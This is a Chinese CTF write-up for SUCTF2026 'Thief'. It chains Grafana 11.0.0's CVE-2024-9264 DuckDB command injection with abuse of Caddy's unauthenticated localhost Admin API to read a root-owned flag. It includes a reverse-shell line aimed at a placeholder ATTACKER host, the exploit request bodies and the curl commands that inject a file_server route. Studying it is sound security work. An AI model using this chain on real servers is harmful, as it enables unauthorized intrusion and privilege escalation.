# SUCTF2026-Thief

## 题目简述

题目环境由 Grafana 11.0.0、DuckDB CLI 和 Caddy 2.8.4 组成。外部流量先进入以 root 身份运行的 Caddy，再反向代理到以低权限 `grafana` 用户运行的 Grafana。预期解法分成两段：先利用 Grafana SQL Expressions 的 CVE-2024-9264 获得低权限命令执行，再访问仅监听本机的 Caddy Admin API，动态加入文件服务器路由，让 root 进程代为读取 `/root/flag`。

总 WP 只记录了赛时环境曾被其他队伍提前改坏，访问后直接看到了 Caddy 暴露的根目录。这能说明非预期状态，却没有解释漏洞成因；下面以官方单题 WP、Dockerfile、`start.sh` 和 Caddy 配置为准还原预期链条。

## 解题过程

### 1. 从环境信息定位 Grafana SQL Expressions

访问首页可以识别出 Grafana 版本为 11.0.0。启动脚本还明确设置了：

```ini
[feature_toggles]
enable = sql_expressions

[security]
admin_user = admin
admin_password = 1q2w3e
disable_brute_force_login_protection = true
```

Dockerfile 另外把 `duckdb` 放进了 `/usr/local/bin`，该目录位于 Grafana 进程的 `PATH` 中。这两个条件不是普通 Grafana 默认环境的巧合，而是 CVE-2024-9264 的必要拼图。

[Grafana 官方安全公告](https://grafana.com/security/security-advisories/cve-2024-9264/)说明，该漏洞源于 SQL Expressions 把未充分净化的查询交给 DuckDB CLI，造成命令注入和本地文件读取；攻击者至少需要 Viewer 权限，而且 `duckdb` 必须能从 Grafana 的 `PATH` 中执行。漏洞从 11.0.0 引入，修复版包括 11.0.5/11.0.6 的安全构建以及相应的 11.1、11.2 修复版。题目恰好固定在受影响的 11.0.0，并主动安装 DuckDB。

官方环境直接把管理员密码设为弱口令 `1q2w3e`，所以无需把登录爆破当成漏洞核心。向 `/login` 提交：

```json
{
  "user": "admin",
  "password": "1q2w3e"
}
```

响应为 `200` 且包含 `"message":"Logged in"` 后，保留 session cookie 即可调用查询 API。

### 2. 经 DuckDB SQL Expressions 获得低权限执行

漏洞入口为：

```text
POST /api/ds/query?ds_type=__expr__&expression=true&requestId=Q100
```

请求中的 datasource 必须选择内部 Expression 数据源，并把查询类型设为 SQL：

```json
{
  "queries": [{
    "datasource": {
      "name": "Expression",
      "type": "__expr__",
      "uid": "__expr__"
    },
    "expression": "SELECT 1; ...",
    "hide": false,
    "refId": "B",
    "type": "sql",
    "window": ""
  }]
}
```

官方 WP 的利用分两步：先用 DuckDB 的 `COPY` 把待执行的 shell 命令写入临时文件，再加载 `shellfs` 扩展，通过带管道的文件读取触发命令。关键 SQL 可以概括为：

```sql
SELECT 1;
COPY (SELECT 'sh -i >& /dev/tcp/ATTACKER/PORT 0>&1')
TO '/tmp/rev';
```

随后再次提交 SQL Expressions：

```sql
SELECT 1;
INSTALL shellfs FROM community;
LOAD shellfs;
SELECT * FROM read_csv('bash /tmp/rev |');
```

第一条查询借 DuckDB 的文件写能力生成命令文件；第二条加载能够访问 shell 管道的扩展，并用 `read_csv` 打开以 `|` 结尾的命令字符串，从而执行 `bash /tmp/rev`。成功后拿到的 shell 身份是 `grafana`，仍不能直接读取权限为 `0600` 的 `/root/flag`。

### 3. 从进程与启动参数发现 Caddy 控制面

查看进程可以发现 Caddy 由 root 启动：

```text
caddy run --config /etc/caddy/caddy_config.json
```

原始配置只让 `:80` 上的 `srv0` 反向代理到 `127.0.0.1:3000`。但 Caddy 默认还在 `localhost:2019` 暴露 Admin API，题目没有改成 Unix socket，也没有把低权限 Grafana 进程与该端口隔离。

[Caddy 官方 API 文档](https://caddyserver.com/docs/api)说明，管理端点默认地址就是 `localhost:2019`，可通过 REST API读取并细粒度修改当前配置；文档同时明确警告，主机上若存在不可信代码执行，应隔离该端点或绑定到受权限保护的 Unix socket。题目正是把“低权限命令执行”和“无鉴权的 root 服务控制面”放在同一网络命名空间中。

先在 Grafana shell 中确认接口可达：

```bash
curl http://127.0.0.1:2019/config/
```

返回当前 JSON 配置即说明可以修改路由。这里不是传统 `sudo` 或 SUID 提权，而是利用 root 服务的管理能力完成 confused deputy：攻击者无权打开 `/root/flag`，但可以让有权限的 Caddy 代为打开并通过 HTTP 返回。

### 4. 动态加入文件服务器路由

可以把一条文件服务器路由插入 `srv0.routes` 的第 0 项，使其先于原反向代理匹配。`/0` 是 JSON 配置路径中的数组下标，不能省略：

```bash
curl -X PUT \
  http://127.0.0.1:2019/config/apps/http/servers/srv0/routes/0 \
  -H 'Content-Type: application/json' \
  -d '{
    "match": [{"path": ["/root/*"]}],
    "handle": [{
      "handler": "file_server",
      "root": "/"
    }]
  }'
```

请求路径 `/root/flag` 会在文件系统根目录 `/` 下解析为 `/root/flag`。配置生效后，从外部访问：

```text
http://target/root/flag
```

即可得到题目 flag。另一种做法是通过 Admin API 新建一个只负责 `file_server` 的服务器并监听额外端口，但修改现有 `:80` 路由更不依赖平台是否开放额外端口。

`start.sh` 每五分钟会从缓存文件恢复原始 Caddy 配置，所以这项修改不是永久持久化；应在加入路由后立即读取 flag。官方仓库中的静态占位 flag 为：

```text
SUCTF{c4ddy_4dm1n_4p1_2019_pr1v35c}
```

比赛平台若动态替换 flag，应以实际响应为准。

## 方法总结

本题是一条“应用 RCE → 本机管理面滥用 → root 文件读取”的组合链。CVE-2024-9264 能成立，是因为 SQL Expressions 已启用、Grafana 版本受影响、DuckDB 位于 `PATH` 且攻击者拥有有效会话；拿到 `grafana` shell 后，真正的权限提升来自 Caddy Admin API，而不是继续寻找内核或本地提权漏洞。

复现时应分别验证三层证据：Grafana 版本和 SQL Expressions 请求是否可执行 DuckDB 语句，当前 shell 能否访问 `127.0.0.1:2019/config/`，新增路由是否位于原反向代理之前。总 WP 中“直接看到 flag”属于被其他队伍改动后的赛时现象，不能替代这条预期利用链。
